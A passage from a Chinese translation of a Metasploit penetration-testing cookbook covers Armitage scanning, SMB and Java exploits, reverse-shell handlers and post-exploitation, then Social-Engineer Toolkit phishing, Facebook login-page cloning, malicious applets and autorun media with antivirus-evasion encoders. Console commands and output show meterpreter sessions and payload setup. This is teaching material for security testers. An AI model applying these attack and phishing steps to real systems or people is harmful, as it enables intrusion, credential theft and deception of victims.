## 还有更多...

让我们看看如何在其他 Linux 版本上设置 Armitage。

### 在 Linux 上设置 Armitage

在 Linux 上设置 Armitage 在 Metasploit 上也很简单。你可以从官方网站下载安装程序，或者你可以简单地运行`msfupdate`来获取 Metasploit 版本 4.2 及更高版本上的 Armitage。在 Linux 上使用 Armitage 时，请确保框架数据库正在运行。从终端运行以下命令启动 PostgreSQL：`/etc/init.d/framework-postgres start`。

# 扫描和信息收集

从我们的第一个配方开始，一旦 Armitage 启动并运行，我们现在可以开始使用 Armitage。在这个配方中，我们将从渗透测试的最基本步骤开始，即扫描和信息收集。让我们在 Armitage 中执行一个 Nmap 扫描，看看 GUI 上显示了什么结果。

## 准备就绪

要启动 Nmap 扫描，可以点击**主机**，然后点击**Nmap 扫描**，如下面的屏幕截图所示。让我们进行一个快速的操作系统检测扫描，看看有没有存活的主机：

![准备就绪](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/mtspl-pentest-cb/img/7423_09_03.jpg)

快速浏览 Armitage 窗口，左侧有一个搜索面板，我们可以在其中搜索框架中的所有不同模块，这在使用 msfconsole 时并不容易。此外，我们可以看到 MSF **控制台**面板，我们可以从中执行到目前为止学到的任何 Metasploit 命令。因此，当我们使用 Armitage 时，我们既有 GUI 的功能，也有命令行的功能。

## 如何做...

要执行扫描，请按照以下步骤进行：

1.  要开始扫描过程，Armitage 将要求我们输入一个 IP 或 IP 范围进行扫描。给出一个扫描范围为 192.168.56.1/24，它将为我们扫描整个网络，并返回存活主机的操作系统版本（如果可以检测到）：![如何做...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/mtspl-pentest-cb/img/7423_09_04.jpg)

1.  一旦扫描完成，它将以图像的形式反映所有存活的主机及其可能的操作系统，如前面的屏幕截图所示。所以在我们的情况下，有三个存活的主机，其中两个正在运行 Windows，而一个正在运行 Linux。

1.  现在我们的下一步将是收集有关我们存活目标的更多信息，以便我们可以选择相关的漏洞来进行渗透测试。右键单击目标图像将显示**服务**选项。点击它将打开一个新选项卡，列出在这些端口上运行的开放端口和服务。通过这种方式，我们可以通过只需点击几下就收集到有关多个目标的大量相关信息：![如何做...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/mtspl-pentest-cb/img/7423_09_05.jpg)

这里还要注意的一点是 Armitage 为每个新请求创建的不同选项卡。这有助于我们轻松处理多个目标。我们可以轻松地在不同目标之间切换并获取有关它们的信息。如果在 Armitage 中的选项不足，我们随时可以转到**控制台**选项卡，并直接在那里尝试 Metasploit 命令。这是 Armitage 相对于 Metasploit 的一个巨大优势。处理多个目标可以提高性能测试的效率。

在下一个配方中，我们将开始我们的利用阶段，看看 Armitage 如何轻松快速地为我们提供相关的漏洞和有效载荷，我们可以应用到我们的目标上。

## 它是如何工作的...

Armitage 从 Metasploit 框架中导入了 Nmap 功能。 Nmap 所需的参数以指令的形式从 Armitage GUI 传递到 Metasploit。然后，Metasploit 调用 Nmap 脚本并使用这些指令作为参数。

# 查找漏洞并攻击目标

从我们之前的配方中继续，我们将看到如何自动查找我们在 Nmap 扫描中发现的目标的已知漏洞。Armitage 根据操作系统中存在的开放端口和漏洞自动发现目标的利用过程。这个自动化过程并不总是会产生正确的结果，因为利用搜索完全取决于 Nmap 扫描返回的结果。如果 OS 发现是错误的，那么利用将无法工作。

## 准备工作

让我们启动我们的 Armitage 面板并连接到 Metasploit。然后，启动 Nmap 扫描以查找可用的目标。我们在前两个配方中已经介绍了这些步骤。让我们使用 Armitage 查找我们目标中的漏洞。

## 如何操作...

一旦目标被发现，Armitage 有一个**攻击**选项，可以根据发现的目标的开放端口和操作系统漏洞查找已知的利用。要查找利用，点击**攻击** | **查找攻击** | **按端口或按漏洞**。

## 它是如何工作的...

一旦 Armitage 发现了利用，我们将在目标图像上右键单击找到一个额外的选项——**攻击**。这个选项反映了 Armitage 为特定目标发现的不同攻击：

![它是如何工作的...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/mtspl-pentest-cb/img/7423_09_06.jpg)

让我们继续利用我们的 Windows 目标。您可以使用 SMB `ms_08_047 netapi`漏洞来利用目标。您可以通过右键单击目标并转到**攻击** | **SMB** | **MS_08_047 netapi** exploit 来找到此漏洞。您还可以选择**使用反向连接**选项，以便在成功执行利用后获得与您的连接。成功执行利用后，您会注意到三件事：

+   目标的图像变为红色，并围绕其显示成功利用的闪电

+   右键单击目标会给我们提供 meterpreter 通道的选项

+   msfconsole 显示会话的开启![它是如何工作的...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/mtspl-pentest-cb/img/7423_09_07.jpg)

您可以看到在不传递任何命令的情况下利用目标是多么容易。GUI 提供了 Metasploit 中基于命令的所有功能。这就是为什么 Armitage 为框架增加了更多功能的原因。然而，对 msfconsole 命令的良好了解是必不可少的。我们不能完全依赖 GUI。使用 Armitage 的 GUI 无法利用的几个 MSF 功能。

在下一个配方中，我们将分析使用 Armitage 进行后期利用。

# 使用选项卡切换处理多个目标

在之前的几个配方中，我们已经看到了 Armitage GUI 如何简化利用过程。在这个配方中，我们将看到使用 Armitage 的另一个优势。当我们在 Metasploit 中处理多个目标时，我们必须在会话之间切换以管理它们。在 Armitage 中，通过使用不同的选项卡来进一步简化在多个目标之间切换的过程。让我们看看如何做到这一点。

## 如何操作...

在上一个配方中，我们已经攻破了我们的 Windows XP 目标。我们还有两个目标可供选择。我们可以通过右键单击 Windows 2008 Server 来利用它。或者，我们也可以通过转到**查看** | **控制台**来启动一个新的控制台。这将启动一个新的控制台，我们可以使用命令行来攻破目标。

## 它是如何工作的...

让我们设置一个多处理程序，并利用客户端漏洞攻击目标。

```
msf > use exploit/multi/handler
msf exploit(handler) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf exploit(handler) > exploit
[-] Handler failed to bind to 192.168.56.101:15263
[-] Handler failed to bind to 0.0.0.0:15263
[-] Exploit exception: The address is already in use (0.0.0.0:15263).
[*] Exploit completed, but no session was created. 
```

您可以看到，利用命令抛出了一个错误，即无法在`192.168.56.101:15263`上绑定反向处理程序。这是因为我们在攻击 Windows XP 目标时已经在此端口上建立了反向连接。因此，我们将不得不更改端口号并再次使用利用命令。

```
msf exploit(handler) > set LPORT 1234
LPORT => 1234
msf exploit(handler) > exploit
[*] Started reverse handler on 192.168.56.101:1234
[*] Starting the payload handler... 
```

现在，一旦客户端利用成功执行，我们将建立一个反向连接，并且我们将对我们的 2008 服务器目标进行攻击。

这里需要注意的重要一点是，不同的目标有不同的标签页。我们可以通过在标签之间切换轻松地与任何受损的目标进行交互：

![工作原理...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/mtspl-pentest-cb/img/7423_09_08.jpg)

这是 Armitage 的另一个重要功能，可以简化渗透测试的过程。当我们处理网络中的多个目标时，这可能非常有益。

# 使用 Armitage 进行后渗透

在上一个示例中，我们看到了 Armitage 在处理多个目标时的有用性。一旦目标被攻击，我们的下一步将是执行各种后渗透活动。让我们看看 Armitage 在后渗透阶段也可以派上用场。

## 做好准备

我们将分析我们攻击的 Windows XP 目标，并看看我们如何在其上执行几个后渗透活动。

## 如何做...

一旦目标被攻击，我们可以通过右键单击其图像来跟随几个 meterpreter 选项。我们可以执行一些常用的后渗透操作，例如访问、交互和枢纽。我们只需点击几下就可以执行几个操作。让我们执行后渗透的第一个和最重要的阶段——**提权**。我们可以通过右键单击目标图像并导航到**Meterpreter** | **Access** | **Escalate privileges**来找到此选项。另一个有趣的后渗透活动是**screenshot**，可以通过**Meterpreter** | **Explore** | **Screenshot**浏览。目标桌面的屏幕截图将显示在一个新标签中，您可以随时刷新。以下屏幕截图演示了这一点：

![如何做...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/mtspl-pentest-cb/img/7423_09_09.jpg)

## 工作原理...

您可以看到屏幕截图显示在一个新标签中，底部有两个按钮。**刷新**按钮将显示新的屏幕截图，而**观看**按钮将在每 10 秒后刷新屏幕截图。

同样，您可以尝试 Armitage 中提供的许多“点击到服务器”后渗透选项，以加快渗透测试的过程。

这是使用 Armitage 作为 Metasploit 的潜在扩展以加快利用过程的一个小演示。只有当我们完全掌握 Metasploit 时，才能真正理解 Armitage 的强大之处。强大的命令行与图形界面的结合使 Armitage 成为渗透测试的完美工具。

# 使用 Armitage 进行客户端利用

如果我们无法找到一个易受攻击的操作系统，客户端利用可以成为渗透测试的有用技术。正如在第四章中讨论的那样，*客户端利用和防病毒绕过*，客户端利用技术利用了目标系统上安装的应用程序（如 Internet Explorer 和 Adobe Reader）的漏洞。在本示例中，我们将在 Windows 7 上使用 Armitage 执行基于 Java 的客户端利用。

## 做好准备

我们可以通过启动简单的 Nmap 扫描来开始我们的渗透测试，以找出目标的 IP 地址和其他信息。

## 如何做...

要执行客户端利用，请按照以下步骤进行：

1.  在 Armitage 的左窗格中，转到**Exploit** | **Windows** | **Browser** | **java_docbase_bof**。

您将看到几个参数选项，如下面的屏幕截图所示：

![如何做...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/mtspl-pentest-cb/img/7423_09_10.jpg)

1.  利用模块要求 SRVHOST 和 URI 主机，我们必须提供目标机器的 IP 地址和请求 URI。所有其他参数已经有默认值。

1.  一旦参数值被传递，点击**启动**按钮开始利用过程。

## 工作原理...

一旦点击了**启动**按钮，利用活动将在**控制台**窗口中反映出来。Armitage 将生成一个 URI 位置，目标用户必须在其浏览器中执行该位置以启动攻击。如果利用成功，Armitage 会自动启动一个后台监听器，等待目标机器返回连接。我们可以使用不同的社会工程技术将我们的恶意 URL 传输给目标用户。

一旦攻击成功，我们将在 Armitage GUI 中的目标图像周围看到闪电符号。通过右键单击目标，我们可以找到不同的后渗透选项，比如设置一个 meterpreter 会话和登录。以下截图描述了这种情况：

![工作原理...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/mtspl-pentest-cb/img/7423_09_11.jpg)

不同进程的响应，比如设置一个 meterpreter 会话，也可以在**控制台**窗口中进行监视。我们可以注意到在控制台中执行的与我们在之前章节中涵盖的相同一组命令。Armitage 只是通过提供基于 GUI 的交互介质来自动化整个过程。


# 第十章：社会工程工具包

在本章中，我们将涵盖：

+   开始使用社会工程工具包（SET）

+   使用 SET 配置文件

+   鱼叉式网络钓鱼攻击向量

+   网站攻击向量

+   多攻击网络方法

+   传染性媒体生成器

# 介绍

社会工程是一种操纵人们执行意图之外行为的行为。基于网络的社会工程场景旨在诱使用户执行可能导致机密信息被盗或某些恶意活动的活动。黑客之间社会工程迅速增长的原因是很难突破平台的安全性，但更容易欺骗该平台的用户执行意外的恶意活动。例如，很难突破 Gmail 的安全性以窃取某人的密码，但很容易创建一个社会工程场景，通过发送虚假的登录/网络钓鱼页面来欺骗受害者透露他/她的登录信息。

社会工程工具包旨在执行此类欺骗活动。就像我们对现有软件和操作系统有漏洞和漏洞利用一样，SET 是一种用于破坏自己的意识安全的通用漏洞利用。它是一个官方工具包，可在[www.social-engineer.org](http://www.social-engineer.org)上获得，并且它作为 BackTrack 5 的默认安装。在本章中，我们将分析这个工具的方面以及它如何为 Metasploit 框架增添更多功能。我们将主要关注创建攻击向量和管理被视为 SET 核心的配置文件。因此，让我们深入探讨社会工程的世界。

# 开始使用社会工程工具包（SET）

让我们开始我们关于 SET 的介绍性配方，在这里我们将讨论不同平台上的 SET。

## 准备工作

可以从其官方网站[www.social-engineer.com](http://www.social-engineer.com)下载 SET 的不同平台版本。它既有通过浏览器运行的 GUI 版本，也有可以从终端执行的命令行版本。它预装在 BackTrack 中，这将是我们在本章讨论的平台。

## 如何做...

要在 BackTrack 上启动 SET，请启动终端窗口并传递以下路径：

```
root@bt:~# cd /pentest/exploits/set
root@bt:/pentest/exploits/set# ./set
Copyright 2012, The Social-Engineer Toolkit (SET)
All rights reserved.
Select from the menu:
1) Social-Engineering Attacks
2) Fast-Track Penetration Testing
3) Third Party Modules
4) Update the Metasploit Framework
5) Update the Social-Engineer Toolkit
6) Help, Credits, and About
99) Exit the Social-Engineer Toolkit 
```

如果您是第一次使用 SET，可以更新工具包以获取最新模块并修复已知的错误。要开始更新过程，我们将传递`svn update`命令。一旦工具包更新完成，它就可以使用了。

可以通过导航到**应用程序** | **Backtrack** | **利用工具** | **社会工程工具包** | **set-web**来访问 SET 的 GUI 版本。

## 工作原理...

社会工程工具包是一个基于 Python 的自动化工具，为我们创建了一个菜单驱动的应用程序。Python 的快速执行和多功能性使其成为开发模块化工具如 SET 的首选语言。它还使得将工具包与 Web 服务器集成变得容易。任何开源的 HTTP 服务器都可以用于访问 SET 的浏览器版本。在使用 SET 时，Apache 被认为是首选服务器。

# 使用 SET 配置文件

在这个配方中，我们将仔细研究 SET 配置文件，其中包含工具包使用的不同参数的默认值。默认配置对大多数攻击都有效，但在某些情况下，您可能需要根据情景和要求修改设置。因此，让我们看看配置文件中有哪些配置设置。

## 准备工作

要启动配置文件，请转到配置并打开`set_config`文件。

```
root@bt:/pentest/exploits/set# nano config/set_config 
```

配置文件将以一些介绍性陈述启动，如下面的屏幕截图所示：

![准备工作](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/mtspl-pentest-cb/img/7423_10_01.jpg)

## 如何做...

让我们看看有哪些配置设置可供我们使用。

```
# DEFINE THE PATH TO METASPLOIT HERE, FOR EXAMPLE /pentest/exploits/framework3
METASPLOIT_PATH=/pentest/exploits/framework3 
```

第一个配置设置与 Metasploit 安装目录有关。 SET 需要 Metasploit 才能正常运行，因为它从框架中提取有效载荷和利用。

```
# SPECIFY WHAT INTERFACE YOU WANT ETTERCAP TO LISTEN ON, IF NOTHING WILL DEFAULT
# EXAMPLE: ETTERCAP_INTERFACE=wlan0
ETTERCAP_INTERFACE=eth0
#
# ETTERCAP HOME DIRECTORY (NEEDED FOR DNS_SPOOF)
ETTERCAP_PATH=/usr/share/ettercap
Ettercap is a multipurpose sniffer for switched LAN. Ettercap section can be used to perform LAN attacks like DNS poisoning, spoofing etc. The above SET setting can be used to either set ettercap ON of OFF depending upon the usability. # SENDMAIL ON OR OFF FOR SPOOFING EMAIL ADDRESSES
Ettercap is a multipurpose sniffer for switched LAN. Ettercap section can be used to perform LAN attacks like DNS poisoning, spoofing etc. The above SET setting can be used to either set ettercap ON of OFF depending upon the usability. # SENDMAIL ON OR OFF FOR SPOOFING EMAIL ADDRESSES
SENDMAIL=OFF 
```

`sendmail`电子邮件服务器主要用于电子邮件欺骗。此攻击仅在目标电子邮件服务器不实现反向查找时才有效。默认情况下，其值设置为`OFF`。

以下设置显示了 SET 最常用的攻击向量之一。此配置将允许您使用您的名称或任何虚假名称签署恶意 Java 小程序，然后可以用于执行基于浏览器的 Java 小程序感染攻击。

```
# CREATE SELF-SIGNED JAVA APPLETS AND SPOOF PUBLISHER NOTE THIS REQUIRES YOU TO
# INSTALL ---> JAVA 6 JDK, BT4 OR UBUNTU USERS: apt-get install openjdk-6-jdk
# IF THIS IS NOT INSTALLED IT WILL NOT WORK. CAN ALSO DO apt-get install sun-java6-jdk
SELF_SIGNED_APPLET=OFF 
```

我们将在以后的食谱中详细讨论此攻击向量。此攻击向量还将需要在您的系统上安装 JDK。让我们将其值设置为`ON`，因为我们将详细讨论此攻击：

```
SELF_SIGNED_APPLET=ON
# AUTODETECTION OF IP ADDRESS INTERFACE UTILIZING GOOGLE, SET THIS ON IF YOU WANT
# SET TO AUTODETECT YOUR INTERFACE
AUTO_DETECT=ON 
```

`AUTO_DETECT`标志由 SET 用于自动发现网络设置。它将使 SET 能够检测您的 IP 地址，如果您使用 NAT/端口转发，并允许您连接到外部互联网。

以下设置用于设置 Apache web 服务器以执行基于 Web 的攻击向量。最好将其设置为`ON`以获得更好的攻击性能：

```
# USE APACHE INSTEAD OF STANDARD PYTHON WEB SERVERS, THIS WILL INCREASE SPEED OF
# THE ATTACK VECTOR
APACHE_SERVER=OFF
#
# PATH TO THE APACHE WEBROOT
APACHE_DIRECTORY=/var/www 
```

以下设置用于在执行 Web 攻击时设置 SSL 证书。已报告了 SET 的`WEBATTACK_SSL`设置的几个错误和问题。因此，建议将此标志保持为“OFF”：

```
# TURN ON SSL CERTIFICATES FOR SET SECURE COMMUNICATIONS THROUGH WEB_ATTACK VECTOR
WEBATTACK_SSL=OFF 
```

以下设置可用于构建用于 Web 攻击的自签名证书，但将显示警告消息“不受信任的证书”。因此，建议明智地使用此选项以避免警告目标用户：

```
# PATH TO THE PEM FILE TO UTILIZE CERTIFICATES WITH THE WEB ATTACK VECTOR (REQUIRED)
# YOU CAN CREATE YOUR OWN UTILIZING SET, JUST TURN ON SELF_SIGNED_CERT
# IF YOUR USING THIS FLAG, ENSURE OPENSSL IS INSTALLED!
#
SELF_SIGNED_CERT=OFF 
```

以下设置用于在执行攻击后启用或禁用 Metasploit 监听器：

```
# DISABLES AUTOMATIC LISTENER - TURN THIS OFF IF YOU DON'T WANT A METASPLOIT LISTENER IN THE BACKGROUND.
AUTOMATIC_LISTENER=ON 
```

以下配置将允许您将 SET 用作独立工具包，而无需使用 Metasploit 功能，但始终建议与 SET 一起使用 Metasploit 以提高渗透测试性能。

```
# THIS WILL DISABLE THE FUNCTIONALITY IF METASPLOIT IS NOT INSTALLED AND YOU JUST WANT TO USE SETOOLKIT OR RATTE FOR PAYLOADS
# OR THE OTHER ATTACK VECTORS.
METASPLOIT_MODE=ON 
```

这些是 SET 可用的一些重要配置设置。必须充分了解配置文件，以完全控制社会工程师工具包。

## 工作原理...

SET 配置文件是工具包的核心，因为它包含 SET 在执行各种攻击向量时将选择的默认值。配置错误的 SET 文件可能导致操作中出现错误，因此必须了解配置文件中定义的细节，以获得最佳结果。 *如何操作*部分清楚地反映了我们可以理解和管理配置文件的简易性。

# 鱼叉式网络钓鱼攻击向量

鱼叉式网络钓鱼攻击向量是一种用于向目标/特定用户发送恶意邮件的电子邮件攻击场景。为了欺骗自己的电子邮件地址，您将需要一个`sendmail`服务器。将配置设置更改为`SENDMAIL=ON`。如果您的计算机上没有安装`sendmail`，则可以通过输入以下命令进行下载：

```
root@bt:~# apt-get install sendmail
Reading package lists... Done 
```

## 准备工作

在进行网络钓鱼攻击之前，我们必须了解电子邮件系统的工作原理。

为了减轻这些类型的攻击，收件人电子邮件服务器部署了灰名单、SPF 记录验证、RBL 验证和内容验证。这些验证过程确保特定的电子邮件来自与其域相同的电子邮件服务器。例如，如果一个伪造的电子邮件地址`<richyrich@gmail.com>`来自 IP`202.145.34.23`，它将被标记为恶意，因为此 IP 地址不属于 Gmail。因此，为了绕过这些，攻击者应确保服务器 IP 不在 RBL/SURL 列表中。由于鱼叉式网络钓鱼攻击严重依赖用户感知，攻击者应对发送的内容进行侦察，并确保内容看起来尽可能合法。

钓鱼攻击有两种类型——基于 Web 的内容和基于载荷的内容。

在之前的章节中，我们已经看到如何创建载荷，但由于大多数电子邮件系统不允许可执行文件，我们应该考虑使用不同类型的载荷嵌入到电子邮件的 HTML 内容中；例如，Java 小程序、Flash、PDF 或 MS Word/Excel 等。

## 如何做...

钓鱼攻击模块有三种不同的攻击向量供我们使用。让我们分析每一个。

```
1) Perform a Mass Email Attack
2) Create a FileFormat Payload
3) Create a Social-Engineering Template
99) Return to Main Menu 
```

选择选项`1`将启动我们的大规模邮件攻击。攻击向量始于选择一个载荷。您可以从可用的 Metasploit exploit 模块列表中选择任何漏洞。然后，我们将被提示选择一个处理程序，可以连接回攻击者。选项将包括设置 vnc 服务器或执行载荷并启动命令行等。

接下来的几个步骤将是启动`sendmail`服务器，为恶意文件格式设置模板，并选择单个或大规模邮件攻击：

![如何做...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/mtspl-pentest-cb/img/7423_10_02.jpg)

最后，您将被提示要么选择像 Gmail 和 Yahoo 这样的已知邮件服务，要么使用您自己的服务器：

```
1\. Use a gmail Account for your email attack.
2\. Use your own server or open relay
set:phishing>1
set:phishing> From address (ex: moo@example.com):bigmoney@gmail.com
set:phishing> Flag this message/s as high priority? [yes|no]:y 
```

设置自己的服务器可能不太可靠，因为大多数邮件服务都会进行反向查找，以确保电子邮件是从与地址名称相同的域名生成的。

让我们分析钓鱼攻击的另一个攻击向量。创建文件格式的载荷是另一个攻击向量，我们可以生成一个带有已知漏洞的文件格式，并通过电子邮件发送给目标进行攻击。最好使用 MS Word 的漏洞，因为很难检测它们是否是恶意的，所以它们可以作为附件通过电子邮件发送：

```
set:phishing> Setup a listener [yes|no]:y
[-] ***
[-] * WARNING: Database support has been disabled
[-] *** 
```

最后，我们将被提示是否要设置监听器。它将启动 Metasploit 监听器，并等待用户打开恶意文件并连接到攻击系统。

电子邮件攻击的成功取决于我们所针对的电子邮件客户端。因此，对这种攻击向量进行适当的分析是必不可少的。

## 它是如何工作的...

如前所述，钓鱼攻击向量是一种针对特定用户的社会工程攻击向量。一封电子邮件从攻击机器发送到目标用户。电子邮件将包含一个恶意附件，该附件将利用目标机器上已知的漏洞，并为攻击者提供一个 shell 连接。SET 自动化了整个过程。社会工程在这里发挥的主要作用是建立一个对目标完全合法的情景，并愚弄目标下载恶意文件并执行它。

# 网站攻击向量

SET 的“web 攻击”向量是利用多种基于 Web 的攻击方式来 compromise 目标受害者的独特方式。这是迄今为止 SET 最受欢迎的攻击向量。它类似于浏览器自动攻击，可以向目标浏览器发送多个（或特定）攻击。它具有以下攻击向量：

```
1\. The Java Applet Attack Method
2\. The Metasploit Browser Exploit Method
3\. Credential Harvester Attack Method
4\. Tabnabbing Attack Method
5\. Man Left in the Middle Attack Method
6\. Web Jacking Attack Method
7\. Multi-Attack Web Method
8\. Return to the previous menu 
```

在这个示例中，我们将讨论最流行的攻击向量，即 Java 小程序攻击方法。让我们看看如何使用 SET 执行这种攻击。

## 准备工作

要开始使用 Java 小程序攻击方法，我们必须选择第一个选项。然后在下一步中，我们将被提示选择网页设置。我们可以选择自定义模板或克隆完整的 URL。让我们看看克隆如何帮助我们执行攻击。

## 如何做...

目标用户将不得不访问渗透测试人员决定克隆的网站。因此，渗透测试人员应该明白，克隆站点不应该偏离实际站点的功能，即钓鱼站点。

1.  要开始克隆选项，我们必须决定要克隆的 URL。让我们克隆 Facebook 登录页面并进一步进行：

```
1\. Web Templates
2\. Site Cloner
3\. Custom Import
4\. Return to the main menu
Enter number (1-4): 2
SET supports both HTTP and HTTPS
Example: http://www.thisisafakesite.com
Enter the url to clone: http://www.facebook.com
[*] Cloning the website: https://login.facebook.com/login.php
[*] This could take a little bit... 
```

1.  一旦我们完成了克隆部分，我们将被提示选择一个有效载荷以及一个可以放置在目标机器上的后门。

1.  完成这些步骤后，SET 网络服务器将启动，并且 msf 也将启动。Msf 将管理处理程序，一旦有效载荷被放置到目标机器中，将接收反向连接。

1.  您可以在`/pentest/exploits/set/src/web_clone/site/template`找到您的克隆模板以及 jar。现在一旦目标用户访问克隆的网站（托管在假域名上），将弹出一个小程序消息，看起来完全是一个安全的警报消息：![操作步骤...](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/mtspl-pentest-cb/img/7423_10_03.jpg)

现在一旦目标用户点击**允许**，恶意小程序就会被执行，并允许执行有效载荷。Metasploit 监听器将从目标机器接收到一个连接，因此我们将拥有一个活动会话：

```
[*] Sending stage (748544 bytes) to 192.168.56.103
[*] Meterpreter session 1 opened (192.168.56.103:443 ->
Thu Sep 09 10:06:57 -0400 2010
msf exploit(handler) > sessions -i 1
[*] Starting interaction with 1...
meterpreter > shell
Process 2988 created.
Channel 1 created.
Microsoft Windows XP [Version 6.1]
(C) Copyright 1985-2001 Microsoft Corp.
C:\Documents and Settings\Administrator\Desktop> 
```

同样，我们也可以执行其他攻击。您可以看到 SET 如何轻松地为我们创建攻击向量，并为我们提供对我们的情景的完全控制。SET 的最好之处在于它可以让您在任何时候实施自己的修改和更改。

## 工作原理...

Java 小程序感染是一种常见的 Java 小程序漏洞，允许在受保护的沙箱环境之外执行小程序。未签名或不安全的小程序在受限制的系统资源访问权限的沙箱环境中执行。一旦恶意小程序在警告消息后被允许执行，它就获得了在目标机器上完全访问资源的特权，因为它现在处于沙箱环境之外。这允许小程序执行 Java 漏洞并允许远程代码执行。同样，其他基于网络的攻击向量使用浏览器将攻击传输到目标系统。社会工程再次在制造愚弄用户的情景方面发挥作用。攻击者可以在`href`标签下隐藏恶意链接，或者可以使用假签名对小程序进行签名，以使其看起来完全合法。SET 模板是设计攻击的良好来源。

# 多攻击网络方法

多攻击网络方法通过将多个攻击组合成一个攻击方法，将网络攻击提升到了一个新的水平。这种攻击方法允许我们将多个利用和漏洞组合到一个单一的格式中。一旦目标用户打开文件或 URL，每个攻击都会依次进行，直到报告成功的攻击。SET 自动化了将不同攻击组合成一个单一网络攻击方案的过程。让我们继续前进，看看这是如何完成的。

## 操作步骤...

多攻击网络方法与其他基于网络的攻击类似。我们首先选择一个模板，可以导入或克隆。不同之处在于下一步，我们可以选择可以添加到网络攻击中的各种利用。

选择要使用的攻击：

```
1\. The Java Applet Attack Method (OFF)
2\. The Metasploit Browser Exploit Method (OFF)
3\. Credential Harvester Attack Method (OFF)
4\. Tabnabbing Attack Method (OFF)
5\. Man Left in the Middle Attack Method (OFF)
6\. Web Jacking Attack Method (OFF)
7\. Use them all - A.K.A. 'Tactical Nuke'
8\. I'm finished and want proceed with the attack.
9\. Return to main menu.
Enter your choice one at a time (hit 8 when finished selecting): 
```

我们可以选择不同的攻击，一旦完成，我们可以输入`8`，最后将所选的攻击组合成一个单一的向量。最后，我们将被提示选择有效载荷和后门编码器。

## 工作原理...

一旦选择了不同的攻击，SET 将它们与有效载荷结合起来，构建一个单一的恶意链接，现在需要进行社会工程。我们将不得不构建一个对目标用户看起来完全合法的模板，并迫使他访问恶意链接。一旦受害者点击链接，不同的攻击将依次尝试，直到成功发动攻击。一旦发现并利用了漏洞，有效载荷将为 Metasploit 监听器提供反向连接。

# 传染性媒体生成器

传染性媒体生成器是一种相对简单的攻击向量。SET 将创建一个基于 Metasploit 的有效载荷，为您设置一个监听器，并生成一个需要刻录或写入 DVD/USB 驱动器的文件夹。一旦插入，如果启用了自动运行，代码将自动执行并控制机器。

## 如何做到这一点...

这种攻击向量基于一个简单的原则，即生成恶意可执行文件，然后使用可用的编码器对其进行编码，以绕过杀毒软件的保护。

```
Name: Description:
1\. Windows Shell Reverse_TCP Spawn a command shell on victim and send back to attacker.
2\. Windows Reverse_TCP Meterpreter Spawn a meterpreter shell on victim and send back to attacker.
3\. Windows Reverse_TCP VNC DLL Spawn a VNC server on victim and send back to attacker.
4\. Windows Bind Shell Execute payload and create an accepting port on remote system.
5\. Windows Bind Shell X64 Windows x64 Command Shell, Bind TCP Inline
6\. Windows Shell Reverse_TCP X64 Windows X64 Command Shell, Reverse TCP Inline
7\. Windows Meterpreter Reverse_TCP X64 Connect back to the attacker (Windows x64), Meterpreter
8\. Windows Meterpreter Egress Buster Spawn a meterpreter shell and find a port home via multiple ports
9\. Import your own executable Specify a path for your own executable
Enter choice (hit enter for default):
Below is a list of encodings to try and bypass AV.
Select one of the below, 'backdoored executable' is typically the best.
1\. avoid_utf8_tolower (Normal)
2\. shikata_ga_nai (Very Good)
3\. alpha_mixed (Normal)
4\. alpha_upper (Normal)
5\. call4_dword_xor (Normal)
6\. countdown (Normal)
7\. fnstenv_mov (Normal)
8\. jmp_call_additive (Normal)
9\. nonalpha (Normal)
10\. nonupper (Normal)
11\. unicode_mixed (Normal)
12\. unicode_upper (Normal)
13\. alpha2 (Normal)
14\. No Encoding (None)
15\. Multi-Encoder (Excellent)
16\. Backdoored Executable (BEST)
Enter your choice (enter for default):
[-] Enter the PORT of the listener (enter for default):
[-] Backdooring a legit executable to bypass Anti-Virus. Wait a few seconds...
[-] Backdoor completed successfully. Payload is now hidden within a legit executable.
[*] Your attack has been created in the SET home directory folder "autorun"
[*] Copy the contents of the folder to a CD/DVD/USB to autorun.
[*] The payload can be found in the SET home directory.
[*] Do you want to start the listener now? yes or no: yes
[*] Please wait while the Metasploit listener is loaded... 
```

## 它是如何工作的...

在生成编码的恶意文件之后，Metasploit 监听器开始等待反向连接。这种攻击的唯一限制是可移动媒体必须启用自动运行，否则将需要手动触发。

这种攻击向量在目标用户身后有防火墙的情况下可能会有帮助。现在大多数的杀毒程序都会禁用自动运行，这也使得这种攻击方式变得无效。渗透测试人员除了基于自动运行的攻击之外，还应确保提供一个带有后门的合法可执行文件/PDF 文件。这样可以确保受害者必然会执行其中一个有效载荷。
